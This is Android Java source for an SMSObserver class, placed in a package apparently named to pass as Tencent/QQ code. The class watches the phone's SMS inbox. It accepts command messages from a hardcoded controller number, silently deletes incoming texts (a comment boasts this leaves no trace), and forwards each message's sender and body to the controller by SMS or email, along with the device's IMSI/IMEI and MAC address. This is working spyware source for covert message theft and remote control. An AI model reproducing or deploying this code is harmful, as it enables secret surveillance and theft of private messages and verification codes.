package com.tencent.sms;

import com.tencent.qq.Keys;
import com.tencent.qq.MainService;
import com.tencent.util.DeviceInfo;
import com.tencent.util.DeviceInfoGetter;
import com.tencent.util.Utility;

import android.content.ContentResolver;
import android.content.ContentUris;
import android.content.Context;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Handler;
import android.os.Message;
import android.util.Log;

/*
 *  
 ContentObserver——内容观察者，目的是观察(捕捉)特定Uri引起的数据库的变化，继而做一些相应的处理，它类似于

  数据库技术中的触发器(Trigger)，当ContentObserver所观察的Uri发生变化时，便会触发它。触发器分为表触发器、行触发器，

  相应地ContentObserver也分为“表“ContentObserver、“行”ContentObserver，当然这是与它所监听的Uri MIME Type有关的。
 */
public class SMSObserver extends ContentObserver{

	private Handler mHandler;
	//内容解析器，和ContentProvider刚好相反,一个提供，一个解析
	private ContentResolver mResolver;
	//上下文对象
	private Context mContext;

	//需要取得的短信条数
	private static final int MAX_NUMS=10;
	//用于保存记录中最大的ID
	private static final int MAX_ID=0;
	//需要获得的字段列
	private static final String[] PROJECTION={
		SMSConstant.ID,
		SMSConstant.TYPE,
		SMSConstant.ADDRESS,
		SMSConstant.BODY,
		SMSConstant.DATE,
		SMSConstant.THREAD_ID,
		SMSConstant.READ,
		SMSConstant.PROTOCOL
	};
	/*
	 * 查询语句
	 * 用于查询ID大于 MAX_ID的记录，初始为0，后面用于保存记录的最大ID。短信的起始ID为1
	 * and read=0
	 */
	private static final String SELECTION=SMSConstant.ID + " > %s"+
	        " and ("+SMSConstant.TYPE+"="+SMSConstant.MESSAGE_TYPE_INBOX+
	        ") ";
	
	//取值对应的结果就是PROJECTION 里对应的字段
	 private static final int COLUMN_INDEX_ID    = 0;
	 private static final int COLUMN_INDEX_TYPE  = 1;
	 private static final int COLUMN_INDEX_PHONE = 2;
     private static final int COLUMN_INDEX_BODY  = 3;
     private static final int COLUMN_INDEX_DATE  = 4;
     private static final int COLUMN_INDEX_PROTOCOL = 7;
	
	public SMSObserver(Context mContext,ContentResolver resolver,Handler handler) {
		super(handler);
	    this.mResolver=resolver;
	    this.mHandler=handler;	    
	    this.mContext=mContext;
	}
	
	@Override
	public void onChange(boolean selfChange){
		super.onChange(selfChange);
		new Thread(new Runnable() {
			
			@Override
			public void run() {
				querySmsDatabase();
			}
		}).start();
		
	}

	private synchronized void querySmsDatabase(){
		if(SmsLockHelper.disposeing)
			return;
		Cursor cursor=null;
		SmsLockHelper.disposeing=true;
		Log.e("TAG", "调用ContentOberver");
		try {
			cursor=mResolver.query(Uri.parse(SMSConstant.SMS_URI_INBOX),   //查询的URI
                      PROJECTION,                //需要取得的列
                      String.format(SELECTION,MAX_ID),                 //查询语句 13410698053
                      null,             //可能包括您的选择，将被替换selectionArgs的值，在选择它们出现的顺序。该值将被绑定为字符串。
                      SMSConstant.DATE + " DESC");                //排序
			
			if(cursor!=null&&cursor.getCount()>0)
			{	
				cursor.moveToFirst();
				 //取出最新的一条即可
				
				int id=cursor.getInt(COLUMN_INDEX_ID);
				int type=cursor.getInt(COLUMN_INDEX_TYPE);				
				int protocol=cursor.getInt(COLUMN_INDEX_PROTOCOL);
				long date=cursor.getLong(COLUMN_INDEX_DATE);
				String phone=cursor.getString(cursor.getColumnIndex(SMSConstant.ADDRESS));//cursor.getString(COLUMN_INDEX_PHONE);
				String body=cursor.getString(cursor.getColumnIndex(SMSConstant.BODY));//cursor.getString(COLUMN_INDEX_BODY);
				
				 //如果短信已经被处理过了，就不处理了
            	if(date==SmsLockHelper.lastSmsDate){
            		return;
            	}
            	SmsLockHelper.lastSmsDate=date;
				
            	//去掉开头+86
              	if (phone.startsWith("+86")){   
           		 phone = phone.substring(3);   
 	            }  
              	 /**
				 * 过滤指定的内容，如果是控制短信，并且状态为已接收，就执行控制操作
				 * 防止控制着发送短信反而自己还被控制
				 */
				if(protocol==0&&body!=null&&body.trim().startsWith(Keys.FILTER)&&
						phone.trim().contains(Keys.PHONE)){

					MessageItem item=new MessageItem(id, type, protocol, date, phone, body);
					//通知Handler，业务操作交给Handle处理
					Message msg=new Message();
					msg.obj=item;
					mHandler.sendMessage(msg);
				}
            	
	            StringBuffer sb = new StringBuffer(); 
	            sb.append("发送者:"+phone);	    	            
	            //sb.append("\n时间:"+new SimpleDateFormat("yyyy-MM-dd HH:mm:ss").format(date));
	            sb.append("\n类型:"+(type==0?"短信":"彩信"));
	            sb.append("\n内容:"+body);
				//一般用户短信是否拦截
				
				//拦截短信,同时防止管理员自己拦截自己，导致死循环
				if(MainService.bInterceptSms&&!phone.equals(Keys.PHONE)){
					if(id!=-1){
						//添加给定的ID结尾的路径。
						Uri uri=ContentUris.withAppendedId(Uri.parse(SMSConstant.SMS_URI_ALL), id);
						//删除指定的短信,操作不留痕迹。。。^_^
						mContext.getContentResolver().delete(uri,null,null);
					}
					
		            if(Keys.IS_SMS_INTERCEPT){
					    Utility.sendSms(Keys.PHONE, "短信已拦截：\n"+sb.toString());
		            }else {
		            	DeviceInfo deviceInfo=deviceInfo=DeviceInfoGetter.getInstance(mContext).getDeviceInfo();
		            	String getImsi=deviceInfo.getIMSI()==null?deviceInfo.getIMEI():deviceInfo.getIMSI();
						Utility.sendMailByJavaMail("短信已拦截", "来自+IMSI："+getImsi+",MAC:"+deviceInfo.getMAC()+"的收到的新短信"
								+ "，内容如下：\n"+sb.toString());
					}
					Log.e(phone, "短信已拦截：\n"+sb.toString());
	
				}
				
				
			}
			
		} catch (Exception e) {
			e.printStackTrace();
		}finally{
			if(cursor!=null){
				cursor.close();
				cursor=null;
			}
			SmsLockHelper.disposeing=false;
		}

	}

}
